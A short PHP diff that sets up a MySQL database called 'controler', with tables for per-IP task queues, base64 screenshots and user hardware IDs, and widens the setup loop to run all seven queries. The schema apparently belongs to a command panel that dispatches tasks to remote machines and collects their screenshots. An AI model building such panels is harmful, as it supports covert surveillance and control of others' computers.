@@ -9,9 +9,9 @@
 			die("Connection failed: " . $conn->connect_error);
 		} 
 
-		$sqls0 = array("CREATE DATABASE controler", "CREATE TABLE `controler`.`task_all` ( `value` VARCHAR(10) NOT NULL DEFAULT 'task_is' , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "INSERT INTO `task_all`(`task`) VALUES ('1111')", "CREATE TABLE `controler`.`task_to` ( `ip` VARCHAR(20) NOT NULL , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`screenshot` ( `ip` VARCHAR(20) NOT NULL , `base64` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`user` ( `ip` TEXT NOT NULL , `user` VARCHAR(20) NOT NULL , `hwid` VARCHAR(18) NOT NULL ) ENGINE = InnoDB;");
+		$sqls0 = array("CREATE DATABASE controler", "CREATE TABLE `controler`.`task_all` ( `value` VARCHAR(10) NOT NULL DEFAULT 'task_is' , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "INSERT INTO `task_all`(`task`) VALUES ('1111')", "CREATE TABLE `controler`.`task_to` ( `ip` VARCHAR(20) NOT NULL , `task` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`screenshot` ( `ip` VARCHAR(20) NOT NULL , `base64` TEXT NOT NULL ) ENGINE = InnoDB;", "CREATE TABLE `controler`.`user` ( `ip` TEXT NOT NULL , `user` VARCHAR(20) NOT NULL , `hwid` VARCHAR(18) NOT NULL ) ENGINE = InnoDB;", "ALTER TABLE `user` ADD `id` INT NOT NULL AUTO_INCREMENT , ADD PRIMARY KEY (`id`);");
 		
-		for ($i = 0; $i != 2; $i++)
+		for ($i = 0; $i != 7; $i++)
 			$conn->query($sqls0[$i]);
 		
 		$conn->close();
